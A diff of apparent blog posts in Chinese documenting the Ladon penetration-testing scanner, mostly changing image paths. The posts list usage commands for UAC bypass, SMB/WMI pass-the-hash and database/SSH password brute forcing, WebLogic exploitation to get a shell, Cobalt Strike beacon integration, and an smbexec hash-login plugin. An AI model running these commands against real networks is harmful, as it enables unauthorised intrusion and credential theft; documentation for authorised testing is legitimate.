 <h3 id="Ladon6-2更新功能"><a href="#Ladon6-2更新功能" class="headerlink" title="Ladon6.2更新功能"></a>Ladon6.2更新功能</h3><p>ID | 模块名称 |  功能说明  | 返回结果<br>-|-|-|-|-<br>0 | <a href="https://github.com/k8gege/Ladon/wiki/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA%E6%89%AB%E6%8F%8F" target="_blank" rel="noopener">OnlinePC</a> | 存活主机扫描 | 存活IP、Mac地址、机器名、设备制造商<br>1 | <a href="https://k8gege.org/p/39070.html">SmbHashScan</a>  |  SMB HASH密码爆破(Windows) | 检测过程、成功密码、LOG文件 |<br>2 | <a href="https://k8gege.org/p/39070.html">WmiHashScan</a>  |  WMI HASH密码爆破(Windows) | 检测过程、成功密码、LOG文件 |<br>3 | <a href="https://k8gege.org/p/39070.html">BypassUac</a>   | 绕过UAC执行,支持Win7-Win10 | Ladon BypassUac c:\1.exe<br>4 | <a href="https://k8gege.org/p/39070.html">EnableDotNet</a>   | 一键启用.net 3.5(2008系统默认未启用) | Ladon EnableDotNet<br>5 | <a href="https://k8gege.org/p/39070.html">gethtml</a>   | 获取内网站点HTML源码 | Ladon gethtml <a href="http://192.168.1.1" target="_blank" rel="noopener">http://192.168.1.1</a><br>6 | <a href="https://k8gege.org/p/39070.html">AdiDnsDump</a>  | 域内机器信息获取(非域内请使用LdapScan探测) | IP、域名<br>7 | <a href="https://k8gege.org/p/39070.html">LdapScan</a>  | 不指定密码时，仅探测LDAP服务器 | IP是否LDAP服务器<br>8 | <a href="https://k8gege.org/p/39070.html">FtpScan</a>  | 不指定密码时，仅探测FTP服务器 | IP是否FTP服务器<br>9| <a href="https://k8gege.org/p/c5430395.html">Ladon.cna</a> | CobaltStrike 3.x-4.0右键菜单 | 一键扫描内网<br>10 命令支持CIDR格式IP扫描<br>11 INI配置支持自定义密码爆破<br>12 PortScan命令行支持自定义端口</p>
 <h3 id="BUG修复"><a href="#BUG修复" class="headerlink" title="BUG修复"></a>BUG修复</h3><p>修复SmbScan遇到%非数字密码停止的BUG<br>修复一些模块扫描TXT列表崩溃的BUG<br>修复LdapScan扫描check.txt只检测一个的bug</p>
-<h3 id="SmbHash密码爆破"><a href="#SmbHash密码爆破" class="headerlink" title="SmbHash密码爆破"></a>SmbHash密码爆破</h3><p><img alt data-original="https://k8gege.org/k8img/Ladon/exe/smbhash.PNG"></p>
-<h3 id="WmiHash密码爆破"><a href="#WmiHash密码爆破" class="headerlink" title="WmiHash密码爆破"></a>WmiHash密码爆破</h3><p><img alt data-original="https://k8gege.org/k8img/Ladon/exe/WmiHash.PNG"></p>
-<h3 id="LDAP服务器识别"><a href="#LDAP服务器识别" class="headerlink" title="LDAP服务器识别"></a>LDAP服务器识别</h3><p>目录下无帐密或相关文件时，使用LDAP协议探测服务器。<br><img alt data-original="https://k8gege.org/k8img/Ladon/exe/LdapScan0.PNG"></p>
-<h3 id="Ftp服务器识别"><a href="#Ftp服务器识别" class="headerlink" title="Ftp服务器识别"></a>Ftp服务器识别</h3><p>目录下无帐密或相关文件时，使用FTP协议探测服务器。<br><img alt data-original="https://k8gege.org/k8img/Ladon/exe/FtpScan0.PNG"></p>
-<h3 id="自定义密码爆破"><a href="#自定义密码爆破" class="headerlink" title="自定义密码爆破"></a>自定义密码爆破</h3><p>详见：<a href="https://k8gege.org/p/53177.html">https://k8gege.org/p/53177.html</a><br><img alt data-original="https://k8gege.org/k8img/Ladon/exe/DiyIniPwd.PNG"></p>
+<h3 id="SmbHash密码爆破"><a href="#SmbHash密码爆破" class="headerlink" title="SmbHash密码爆破"></a>SmbHash密码爆破</h3><p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/exe/smbhash.PNG"></p>
+<h3 id="WmiHash密码爆破"><a href="#WmiHash密码爆破" class="headerlink" title="WmiHash密码爆破"></a>WmiHash密码爆破</h3><p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/exe/WmiHash.PNG"></p>
+<h3 id="LDAP服务器识别"><a href="#LDAP服务器识别" class="headerlink" title="LDAP服务器识别"></a>LDAP服务器识别</h3><p>目录下无帐密或相关文件时，使用LDAP协议探测服务器。<br><img alt="使用http访问查看图片" data-original="/k8img/Ladon/exe/LdapScan0.PNG"></p>
+<h3 id="Ftp服务器识别"><a href="#Ftp服务器识别" class="headerlink" title="Ftp服务器识别"></a>Ftp服务器识别</h3><p>目录下无帐密或相关文件时，使用FTP协议探测服务器。<br><img alt="使用http访问查看图片" data-original="/k8img/Ladon/exe/FtpScan0.PNG"></p>
+<h3 id="自定义密码爆破"><a href="#自定义密码爆破" class="headerlink" title="自定义密码爆破"></a>自定义密码爆破</h3><p>详见：<a href="https://k8gege.org/p/53177.html">https://k8gege.org/p/53177.html</a><br><img alt="使用http访问查看图片" data-original="/k8img/Ladon/exe/DiyIniPwd.PNG"></p>
 <h3 id="OnlinePC存活主机"><a href="#OnlinePC存活主机" class="headerlink" title="OnlinePC存活主机"></a>OnlinePC存活主机</h3><p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/exe/OnlinePC6.2.png"></p>
 <h3 id="PortScan端口扫描"><a href="#PortScan端口扫描" class="headerlink" title="PortScan端口扫描"></a>PortScan端口扫描</h3><p>命令行支持自定义端口，而不是非要ports.txt指定端口<br>Ladon 192.168.1.8-192.168.1.200 PortScan 22,80,1433,21,3306,1521<br><img alt="使用http访问查看图片" data-original="/k8img/Ladon/exe/PortScan6.2.PNG"></p>
 <h3 id="工具下载"><a href="#工具下载" class="headerlink" title="工具下载"></a>工具下载</h3><p>最新版本：<a href="https://k8gege.org/Download">https://k8gege.org/Download</a><br>历史版本: <a href="https://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/releases</a></p>
@@ -7760,10 +7760,10 @@ window.location.href="https://k8gege.org/Ladon/sshscan.html";
 </tbody></table>
 <h3 id="暂不支持功能"><a href="#暂不支持功能" class="headerlink" title="暂不支持功能"></a>暂不支持功能</h3><p>=============================================<br>Struts2Poc  X不支持<br>TomcatScan X不支持<br>HttpBasicScan X不支持，只能检测是否401认证URL，无法爆破<br>WeblogicPoc X 竟然不支持(Win下mono也不支持，显然mono问题)<br>MssqlScan X不支持只能扫到开放端口<br>IpcScan X不支持(因为调用cmd命令)</p>
 <h3 id="MacOS功能实测"><a href="#MacOS功能实测" class="headerlink" title="MacOS功能实测"></a>MacOS功能实测</h3><p>由于环境少原因，仅测了以下功能，其它模块请自行测试。<br>可用功能应该和在Kali下可使用差不多，如不可用可反馈。</p>
-<h4 id="MS17010漏洞扫描"><a href="#MS17010漏洞扫描" class="headerlink" title="MS17010漏洞扫描"></a>MS17010漏洞扫描</h4><p><img alt data-original="https://k8gege.org/k8img/Ladon/mac/mac_ms17010.jpg"></p>
-<h4 id="OsScan系统探测"><a href="#OsScan系统探测" class="headerlink" title="OsScan系统探测"></a>OsScan系统探测</h4><p><img alt data-original="https://k8gege.org/k8img/Ladon/mac/mac_osscan.jpg"></p>
-<h4 id="UrlScan、Base64加解密"><a href="#UrlScan、Base64加解密" class="headerlink" title="UrlScan、Base64加解密"></a>UrlScan、Base64加解密</h4><p><img alt data-original="https://k8gege.org/k8img/Ladon/mac/mac_UrlScan.jpg"></p>
-<h4 id="webScan-SameWeb网站信息扫描"><a href="#webScan-SameWeb网站信息扫描" class="headerlink" title="webScan/SameWeb网站信息扫描"></a>webScan/SameWeb网站信息扫描</h4><p><img alt data-original="https://k8gege.org/k8img/Ladon/mac/mac_sameWeb.jpg"></p>
+<h4 id="MS17010漏洞扫描"><a href="#MS17010漏洞扫描" class="headerlink" title="MS17010漏洞扫描"></a>MS17010漏洞扫描</h4><p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/mac/mac_ms17010.jpg"></p>
+<h4 id="OsScan系统探测"><a href="#OsScan系统探测" class="headerlink" title="OsScan系统探测"></a>OsScan系统探测</h4><p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/mac/mac_osscan.jpg"></p>
+<h4 id="UrlScan、Base64加解密"><a href="#UrlScan、Base64加解密" class="headerlink" title="UrlScan、Base64加解密"></a>UrlScan、Base64加解密</h4><p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/mac/mac_UrlScan.jpg"></p>
+<h4 id="webScan-SameWeb网站信息扫描"><a href="#webScan-SameWeb网站信息扫描" class="headerlink" title="webScan/SameWeb网站信息扫描"></a>webScan/SameWeb网站信息扫描</h4><p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/mac/mac_sameWeb.jpg"></p>
 <h3 id="工具下载"><a href="#工具下载" class="headerlink" title="工具下载"></a>工具下载</h3><p>最新版本：<a href="https://k8gege.org/Download">https://k8gege.org/Download</a><br>历史版本: <a href="https://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/releases</a></p>
 ]]></content>
       <categories>
@@ -7820,10 +7820,10 @@ window.location.href="https://k8gege.org/Ladon/sshscan.html";
     <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>Ladon 6.2支持Cobalt Strike 4.0,内置58个功能<br>加载脚本Ladon.cna,通过Beacon命令或右键使用</p>
 <h3 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h3><p>CS命令行下扫描目标内网,无需代理转发扫描收集信息、密码爆破等<br>跳板扫描外网资产(即无需代理直接通过在控机器扫描其它目标资产)</p>
 <h3 id="Ladon右键菜单"><a href="#Ladon右键菜单" class="headerlink" title="Ladon右键菜单"></a>Ladon右键菜单</h3><p>相比Beacon命令行，GUI就更简单了，只需填写IP、URL等，一键扫描</p>
-<p>主菜单<br><img alt data-original="https://k8gege.org/k8img/Ladon/cs/CS4_Ladon.PNG"><br>资产扫描<br><img alt data-original="https://k8gege.org/k8img/Ladon/cs/CS4_LadonDiscover.PNG"><br>漏洞检测<br><img alt data-original="https://k8gege.org/k8img/Ladon/cs/CS4_LadonVulScan.PNG"><br>密码爆破<br><img alt data-original="https://k8gege.org/k8img/Ladon/cs/CS4_LadonBrute.PNG"><br>网络嗅探<br><img alt data-original="https://k8gege.org/k8img/Ladon/cs/CS4_LadonSinfiier.PNG"><br>信息收集<br><img alt data-original="https://k8gege.org/k8img/Ladon/cs/CS4_LadonGetinfo.PNG"></p>
-<p>例子：WmiHash密码爆破<br><img alt data-original="https://k8gege.org/k8img/Ladon/exe/WmiHash.PNG"></p>
+<p>主菜单<br><img alt="使用http访问查看图片" data-original="/k8img/Ladon/cs/CS4_Ladon.PNG"><br>资产扫描<br><img alt="使用http访问查看图片" data-original="/k8img/Ladon/cs/CS4_LadonDiscover.PNG"><br>漏洞检测<br><img alt="使用http访问查看图片" data-original="/k8img/Ladon/cs/CS4_LadonVulScan.PNG"><br>密码爆破<br><img alt="使用http访问查看图片" data-original="/k8img/Ladon/cs/CS4_LadonBrute.PNG"><br>网络嗅探<br><img alt="使用http访问查看图片" data-original="/k8img/Ladon/cs/CS4_LadonSinfiier.PNG"><br>信息收集<br><img alt="使用http访问查看图片" data-original="/k8img/Ladon/cs/CS4_LadonGetinfo.PNG"></p>
+<p>例子：WmiHash密码爆破<br><img alt="使用http访问查看图片" data-original="/k8img/Ladon/exe/WmiHash.PNG"></p>
 <h3 id="Beacon命令帮助"><a href="#Beacon命令帮助" class="headerlink" title="Beacon命令帮助"></a>Beacon命令帮助</h3><p>Example: Ladon help</p>
-<p><img alt data-original="https://k8gege.org/k8img/Ladon/CS_Ladon.gif"></p>
+<p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/CS_Ladon.gif"></p>
 <h3 id="1-MS17010-MS17-010漏洞扫描"><a href="#1-MS17010-MS17-010漏洞扫描" class="headerlink" title="1.MS17010 MS17-010漏洞扫描"></a>1.MS17010 MS17-010漏洞扫描</h3><p>Example: Ladon 192.168.1.8/24 MS17010<br>结果:IP、SMB漏洞、机器名、操作系统版本<br><img alt="MS17010" data-original="https://k8gege.org/k8img/Ladon/cs/CS_MS17010.gif"></p>
 <h3 id="2-OSscan-操作系统探测"><a href="#2-OSscan-操作系统探测" class="headerlink" title="2.OSscan 操作系统探测"></a>2.OSscan 操作系统探测</h3><p>Example: Ladon 192.168.1.8/24 OSscan<br>通过SMB、多端口、Banner等方式探测（存活主机、主机名、域名、操作系统版本、开放服务等）<br><img alt="OSscan" data-original="https://k8gege.org/k8img/Ladon/cs/CS_OSscan.gif"></p>
 <h3 id="3-OnlinePC-存活主机扫描"><a href="#3-OnlinePC-存活主机扫描" class="headerlink" title="3.OnlinePC 存活主机扫描"></a>3.OnlinePC 存活主机扫描</h3><p>Example: Ladon 192.168.1.8/24 OnlinePC<br>也支持检测主机名/域名是否存活,结果IP、Mac、机器名<br><img alt="OnlinePC" data-original="https://k8gege.org/k8img/Ladon/cs/CS_OnlinePC.gif"></p>
@@ -7834,23 +7834,23 @@ window.location.href="https://k8gege.org/Ladon/sshscan.html";
 <h3 id="8-UrlScan-C段域名URL扫描"><a href="#8-UrlScan-C段域名URL扫描" class="headerlink" title="8.UrlScan C段域名URL扫描"></a>8.UrlScan C段域名URL扫描</h3><p>Example: Ladon 192.168.1.8/24 UrlScan<br>通过源码获取域名或URL，但不验证IP,适用于内网扫描时，目标域名指向外网IP<br>或者通过域名判断内网站点是何产品，比如出现cisco.com域名，说明此为cisco设备<br><img alt="UrlScan" data-original="https://k8gege.org/k8img/Ladon/cs/CS_UrlScan.gif"></p>
 <h3 id="9-SameWeb-C段旁站扫描"><a href="#9-SameWeb-C段旁站扫描" class="headerlink" title="9.SameWeb C段旁站扫描"></a>9.SameWeb C段旁站扫描</h3><p>Example: Ladon 192.168.1.8/24 SameWeb<br>通过源码获取域名并验证IP，返回正确的同服站点,非bing或爱站等方式,即内网不可上网也可扫描<br>验证IP主要适用于，外网扫描时旁站，因为获取的域名指向外网时，无法通过IP判断是否属于同服<br><img alt="SameWeb" data-original="https://k8gege.org/k8img/Ladon/cs/CS_SameWeb.gif"></p>
 <h3 id="10-WeblogicExp-amp-WeblogicPoc"><a href="#10-WeblogicExp-amp-WeblogicPoc" class="headerlink" title="10.WeblogicExp &amp; WeblogicPoc"></a>10.WeblogicExp &amp; WeblogicPoc</h3><p>Example: Ladon 192.168.1.8/24 WeblogicPoc<br>Example: Ladon 192.168.1.8/24 WeblogicExp<br>Weblogic漏洞扫描两个模块,一个是只扫描是否存在漏洞，另一个是扫描并且GetShell<br><img alt="WeblogicExp" data-original="https://k8gege.org/k8img/Ladon/cs/CS_WeblogicExp.gif"></p>
-<h3 id="11-EnumMSSQL-枚举局域网MS-SQL-SERVER数据库主机"><a href="#11-EnumMSSQL-枚举局域网MS-SQL-SERVER数据库主机" class="headerlink" title="11.EnumMSSQL 枚举局域网MS SQL SERVER数据库主机"></a>11.EnumMSSQL 枚举局域网MS SQL SERVER数据库主机</h3><p>Example: Ladon 192.168.1.8/24 EnumMSSQL<br>和PowerUpSql一样不一定能获取到SQL版本<br><img alt data-original="https://k8gege.org/k8img/Ladon/cs/CS_EnumMSSQL.gif"></p>
-<h3 id="12-EnumShare-枚举局域网共享资源"><a href="#12-EnumShare-枚举局域网共享资源" class="headerlink" title="12.EnumShare 枚举局域网共享资源"></a>12.EnumShare 枚举局域网共享资源</h3><p>Example: Ladon 192.168.1.8/24 EnumShare<br><img alt data-original="https://k8gege.org/k8img/Ladon/cs/CS_EnumShare.gif"></p>
-<h3 id="13-MssqlScan-MSSQL数据库密码爆破"><a href="#13-MssqlScan-MSSQL数据库密码爆破" class="headerlink" title="13.MssqlScan MSSQL数据库密码爆破"></a>13.MssqlScan MSSQL数据库密码爆破</h3><p>Example: Ladon 192.168.1.8/24 MssqlScan<br><img alt data-original="https://k8gege.org/k8img/Ladon/cs/CS_MssqlScan.gif"></p>
-<h3 id="14-MysqlScan-MySQL数据库密码爆破"><a href="#14-MysqlScan-MySQL数据库密码爆破" class="headerlink" title="14.MysqlScan MySQL数据库密码爆破"></a>14.MysqlScan MySQL数据库密码爆破</h3><p>Example: Ladon 192.168.1.8/24 MysqlScan<br><img alt data-original="https://k8gege.org/k8img/Ladon/cs/CS_MysqlScan.gif"></p>
-<h3 id="15-SSHscan-SSH主机密码爆破"><a href="#15-SSHscan-SSH主机密码爆破" class="headerlink" title="15.SSHscan SSH主机密码爆破"></a>15.SSHscan SSH主机密码爆破</h3><p>Example: Ladon 192.168.1.8/24 SSHscan<br><img alt data-original="https://k8gege.org/k8img/Ladon/cs/CS_SSHscan.gif"></p>
-<h3 id="16-OracleScan-Oracle数据库密码爆破"><a href="#16-OracleScan-Oracle数据库密码爆破" class="headerlink" title="16.OracleScan Oracle数据库密码爆破"></a>16.OracleScan Oracle数据库密码爆破</h3><p>Example: Ladon 192.168.1.8/24 OracleScan<br><img alt data-original="https://k8gege.org/k8img/Ladon/cs/CS_OracleScan.gif"></p>
-<h3 id="17-HostIP-域名解析-主机名转IP"><a href="#17-HostIP-域名解析-主机名转IP" class="headerlink" title="17.HostIP 域名解析/主机名转IP"></a>17.HostIP 域名解析/主机名转IP</h3><p>Example: Ladon 192.168.1.8/24 HostIP<br><img alt data-original="https://k8gege.org/k8img/Ladon/cs/CS_HostIP.gif"></p>
-<h3 id="18-WhatCMS-Web指纹识别支持75种"><a href="#18-WhatCMS-Web指纹识别支持75种" class="headerlink" title="18.WhatCMS Web指纹识别支持75种"></a>18.WhatCMS Web指纹识别支持75种</h3><p>Example: Ladon 192.168.1.8/24 WhatCMS<br>url.txt指定站点或批量站点扫描,也可扫描整个C段部分web端口对应CMS<br><img alt data-original="https://k8gege.org/k8img/Ladon/cs/CS_WhatCMS.gif"></p>
-<h3 id="19-IpcScan-Windows密码爆破-Wmi被拒绝时可尝试Ipc"><a href="#19-IpcScan-Windows密码爆破-Wmi被拒绝时可尝试Ipc" class="headerlink" title="19.IpcScan Windows密码爆破(Wmi被拒绝时可尝试Ipc)"></a>19.IpcScan Windows密码爆破(Wmi被拒绝时可尝试Ipc)</h3><p>Example: Ladon 192.168.1.8/24 IpcScan<br><img alt data-original="https://k8gege.org/k8img/Ladon/cs/CS_IpcScan.gif"></p>
-<h3 id="21-EnBase64-DeBase64-Base64密码批量加密解密"><a href="#21-EnBase64-DeBase64-Base64密码批量加密解密" class="headerlink" title="21.EnBase64/DeBase64  Base64密码批量加密解密"></a>21.EnBase64/DeBase64  Base64密码批量加密解密</h3><p>Example: Ladon 明文字符串 EnBase64<br>Example: Ladon Base64内容 DeBase64<br><img alt data-original="https://k8gege.org/k8img/Ladon/cs/CS_Base64.gif"></p>
-<h3 id="22-EnHex-DeHex-Hex密码批量加密解密-3种格式"><a href="#22-EnHex-DeHex-Hex密码批量加密解密-3种格式" class="headerlink" title="22.EnHex/DeHex  Hex密码批量加密解密(3种格式)"></a>22.EnHex/DeHex  Hex密码批量加密解密(3种格式)</h3><p>Example: Ladon 明文字符串 EnHex<br>Example: Ladon 16进制内容 EnHex<br><img alt data-original="https://k8gege.org/k8img/Ladon/cs/CS_DeHex.gif"></p>
-<h3 id="23-SmbScan-Windows密码爆破-Wmi被拒绝时可尝试-记录错误日志"><a href="#23-SmbScan-Windows密码爆破-Wmi被拒绝时可尝试-记录错误日志" class="headerlink" title="23.SmbScan Windows密码爆破(Wmi被拒绝时可尝试,记录错误日志)"></a>23.SmbScan Windows密码爆破(Wmi被拒绝时可尝试,记录错误日志)</h3><p>Example: Ladon 192.168.1.8/24 SmbScan<br><img alt data-original="https://k8gege.org/k8img/Ladon/cs/CS_SmbScan.gif"></p>
-<h3 id="24-PhpStudyPoc-PhpStudy后门检测"><a href="#24-PhpStudyPoc-PhpStudy后门检测" class="headerlink" title="24.PhpStudyPoc PhpStudy后门检测"></a>24.PhpStudyPoc PhpStudy后门检测</h3><p>Example: Ladon 192.168.1.8/24 PhpStudyPoc<br><img alt data-original="https://k8gege.org/k8img/Ladon/cs/CS_PhpStudyPoc.gif"></p>
-<h3 id="25-DomainIP-域名解析"><a href="#25-DomainIP-域名解析" class="headerlink" title="25.DomainIP 域名解析"></a>25.DomainIP 域名解析</h3><p>Example: Ladon youdomain DomainIP<br><img alt data-original="https://k8gege.org/k8img/Ladon/cs/CS_DomainIP.gif"></p>
-<h3 id="26-SubDomain-子域名爆破"><a href="#26-SubDomain-子域名爆破" class="headerlink" title="26.SubDomain 子域名爆破"></a>26.SubDomain 子域名爆破</h3><p>Example: Ladon 192.168.1.8/24 SubDomain<br>需域名字典SubDomain.dic<br>例子: Ladon baidu.com SubDomain<br><img alt data-original="https://k8gege.org/k8img/Ladon/cs/CS_SubDomain.gif"></p>
-<h3 id="27-WebDir-Web目录扫描"><a href="#27-WebDir-Web目录扫描" class="headerlink" title="27.WebDir Web目录扫描"></a>27.WebDir Web目录扫描</h3><p>Example: Ladon <a href="http://youweb.com" target="_blank" rel="noopener">http://youweb.com</a> WebDir<br><img alt data-original="https://k8gege.org/k8img/Ladon/cs/CS_WebDir.gif"></p>
-<h3 id="28-ActiveMQPoc-ActiveMQ漏洞扫描"><a href="#28-ActiveMQPoc-ActiveMQ漏洞扫描" class="headerlink" title="28.ActiveMQPoc ActiveMQ漏洞扫描"></a>28.ActiveMQPoc ActiveMQ漏洞扫描</h3><p>Example: Ladon 192.168.1.8/24 ActiveMQPoc<br><img alt data-original="https://k8gege.org/k8img/Ladon/cs/CS_ActiveMQPoc.gif"></p>
+<h3 id="11-EnumMSSQL-枚举局域网MS-SQL-SERVER数据库主机"><a href="#11-EnumMSSQL-枚举局域网MS-SQL-SERVER数据库主机" class="headerlink" title="11.EnumMSSQL 枚举局域网MS SQL SERVER数据库主机"></a>11.EnumMSSQL 枚举局域网MS SQL SERVER数据库主机</h3><p>Example: Ladon 192.168.1.8/24 EnumMSSQL<br>和PowerUpSql一样不一定能获取到SQL版本<br><img alt="使用http访问查看图片" data-original="/k8img/Ladon/cs/CS_EnumMSSQL.gif"></p>
+<h3 id="12-EnumShare-枚举局域网共享资源"><a href="#12-EnumShare-枚举局域网共享资源" class="headerlink" title="12.EnumShare 枚举局域网共享资源"></a>12.EnumShare 枚举局域网共享资源</h3><p>Example: Ladon 192.168.1.8/24 EnumShare<br><img alt="使用http访问查看图片" data-original="/k8img/Ladon/cs/CS_EnumShare.gif"></p>
+<h3 id="13-MssqlScan-MSSQL数据库密码爆破"><a href="#13-MssqlScan-MSSQL数据库密码爆破" class="headerlink" title="13.MssqlScan MSSQL数据库密码爆破"></a>13.MssqlScan MSSQL数据库密码爆破</h3><p>Example: Ladon 192.168.1.8/24 MssqlScan<br><img alt="使用http访问查看图片" data-original="/k8img/Ladon/cs/CS_MssqlScan.gif"></p>
+<h3 id="14-MysqlScan-MySQL数据库密码爆破"><a href="#14-MysqlScan-MySQL数据库密码爆破" class="headerlink" title="14.MysqlScan MySQL数据库密码爆破"></a>14.MysqlScan MySQL数据库密码爆破</h3><p>Example: Ladon 192.168.1.8/24 MysqlScan<br><img alt="使用http访问查看图片" data-original="/k8img/Ladon/cs/CS_MysqlScan.gif"></p>
+<h3 id="15-SSHscan-SSH主机密码爆破"><a href="#15-SSHscan-SSH主机密码爆破" class="headerlink" title="15.SSHscan SSH主机密码爆破"></a>15.SSHscan SSH主机密码爆破</h3><p>Example: Ladon 192.168.1.8/24 SSHscan<br><img alt="使用http访问查看图片" data-original="/k8img/Ladon/cs/CS_SSHscan.gif"></p>
+<h3 id="16-OracleScan-Oracle数据库密码爆破"><a href="#16-OracleScan-Oracle数据库密码爆破" class="headerlink" title="16.OracleScan Oracle数据库密码爆破"></a>16.OracleScan Oracle数据库密码爆破</h3><p>Example: Ladon 192.168.1.8/24 OracleScan<br><img alt="使用http访问查看图片" data-original="/k8img/Ladon/cs/CS_OracleScan.gif"></p>
+<h3 id="17-HostIP-域名解析-主机名转IP"><a href="#17-HostIP-域名解析-主机名转IP" class="headerlink" title="17.HostIP 域名解析/主机名转IP"></a>17.HostIP 域名解析/主机名转IP</h3><p>Example: Ladon 192.168.1.8/24 HostIP<br><img alt="使用http访问查看图片" data-original="/k8img/Ladon/cs/CS_HostIP.gif"></p>
+<h3 id="18-WhatCMS-Web指纹识别支持75种"><a href="#18-WhatCMS-Web指纹识别支持75种" class="headerlink" title="18.WhatCMS Web指纹识别支持75种"></a>18.WhatCMS Web指纹识别支持75种</h3><p>Example: Ladon 192.168.1.8/24 WhatCMS<br>url.txt指定站点或批量站点扫描,也可扫描整个C段部分web端口对应CMS<br><img alt="使用http访问查看图片" data-original="/k8img/Ladon/cs/CS_WhatCMS.gif"></p>
+<h3 id="19-IpcScan-Windows密码爆破-Wmi被拒绝时可尝试Ipc"><a href="#19-IpcScan-Windows密码爆破-Wmi被拒绝时可尝试Ipc" class="headerlink" title="19.IpcScan Windows密码爆破(Wmi被拒绝时可尝试Ipc)"></a>19.IpcScan Windows密码爆破(Wmi被拒绝时可尝试Ipc)</h3><p>Example: Ladon 192.168.1.8/24 IpcScan<br><img alt="使用http访问查看图片" data-original="/k8img/Ladon/cs/CS_IpcScan.gif"></p>
+<h3 id="21-EnBase64-DeBase64-Base64密码批量加密解密"><a href="#21-EnBase64-DeBase64-Base64密码批量加密解密" class="headerlink" title="21.EnBase64/DeBase64  Base64密码批量加密解密"></a>21.EnBase64/DeBase64  Base64密码批量加密解密</h3><p>Example: Ladon 明文字符串 EnBase64<br>Example: Ladon Base64内容 DeBase64<br><img alt="使用http访问查看图片" data-original="/k8img/Ladon/cs/CS_Base64.gif"></p>
+<h3 id="22-EnHex-DeHex-Hex密码批量加密解密-3种格式"><a href="#22-EnHex-DeHex-Hex密码批量加密解密-3种格式" class="headerlink" title="22.EnHex/DeHex  Hex密码批量加密解密(3种格式)"></a>22.EnHex/DeHex  Hex密码批量加密解密(3种格式)</h3><p>Example: Ladon 明文字符串 EnHex<br>Example: Ladon 16进制内容 EnHex<br><img alt="使用http访问查看图片" data-original="/k8img/Ladon/cs/CS_DeHex.gif"></p>
+<h3 id="23-SmbScan-Windows密码爆破-Wmi被拒绝时可尝试-记录错误日志"><a href="#23-SmbScan-Windows密码爆破-Wmi被拒绝时可尝试-记录错误日志" class="headerlink" title="23.SmbScan Windows密码爆破(Wmi被拒绝时可尝试,记录错误日志)"></a>23.SmbScan Windows密码爆破(Wmi被拒绝时可尝试,记录错误日志)</h3><p>Example: Ladon 192.168.1.8/24 SmbScan<br><img alt="使用http访问查看图片" data-original="/k8img/Ladon/cs/CS_SmbScan.gif"></p>
+<h3 id="24-PhpStudyPoc-PhpStudy后门检测"><a href="#24-PhpStudyPoc-PhpStudy后门检测" class="headerlink" title="24.PhpStudyPoc PhpStudy后门检测"></a>24.PhpStudyPoc PhpStudy后门检测</h3><p>Example: Ladon 192.168.1.8/24 PhpStudyPoc<br><img alt="使用http访问查看图片" data-original="/k8img/Ladon/cs/CS_PhpStudyPoc.gif"></p>
+<h3 id="25-DomainIP-域名解析"><a href="#25-DomainIP-域名解析" class="headerlink" title="25.DomainIP 域名解析"></a>25.DomainIP 域名解析</h3><p>Example: Ladon youdomain DomainIP<br><img alt="使用http访问查看图片" data-original="/k8img/Ladon/cs/CS_DomainIP.gif"></p>
+<h3 id="26-SubDomain-子域名爆破"><a href="#26-SubDomain-子域名爆破" class="headerlink" title="26.SubDomain 子域名爆破"></a>26.SubDomain 子域名爆破</h3><p>Example: Ladon 192.168.1.8/24 SubDomain<br>需域名字典SubDomain.dic<br>例子: Ladon baidu.com SubDomain<br><img alt="使用http访问查看图片" data-original="/k8img/Ladon/cs/CS_SubDomain.gif"></p>
+<h3 id="27-WebDir-Web目录扫描"><a href="#27-WebDir-Web目录扫描" class="headerlink" title="27.WebDir Web目录扫描"></a>27.WebDir Web目录扫描</h3><p>Example: Ladon <a href="http://youweb.com" target="_blank" rel="noopener">http://youweb.com</a> WebDir<br><img alt="使用http访问查看图片" data-original="/k8img/Ladon/cs/CS_WebDir.gif"></p>
+<h3 id="28-ActiveMQPoc-ActiveMQ漏洞扫描"><a href="#28-ActiveMQPoc-ActiveMQ漏洞扫描" class="headerlink" title="28.ActiveMQPoc ActiveMQ漏洞扫描"></a>28.ActiveMQPoc ActiveMQ漏洞扫描</h3><p>Example: Ladon 192.168.1.8/24 ActiveMQPoc<br><img alt="使用http访问查看图片" data-original="/k8img/Ladon/cs/CS_ActiveMQPoc.gif"></p>
 <h3 id="工具下载"><a href="#工具下载" class="headerlink" title="工具下载"></a>工具下载</h3><p>最新版本：<a href="https://k8gege.org/Download">https://k8gege.org/Download</a><br>历史版本: <a href="https://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/releases</a></p>
 ]]></content>
       <categories>
@@ -7873,7 +7873,7 @@ window.location.href="https://k8gege.org/Ladon/sshscan.html";
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[Ladon]</span><br><span class="line">exe=smbexec.exe</span><br><span class="line">arg=-hashes <span class="variable">$pass</span>$ <span class="variable">$user</span><span class="variable">$@</span><span class="variable">$ip</span>$</span><br><span class="line">isok=Launching semi-interactive shell</span><br><span class="line">port=445</span><br><span class="line"><span class="built_in">log</span>=<span class="literal">true</span></span><br></pre></td></tr></table></figure>
 <h3 id="INI插件用法"><a href="#INI插件用法" class="headerlink" title="INI插件用法"></a>INI插件用法</h3><p>命令：Ladon 192.168.1.1/24 smbhash.ini</p>
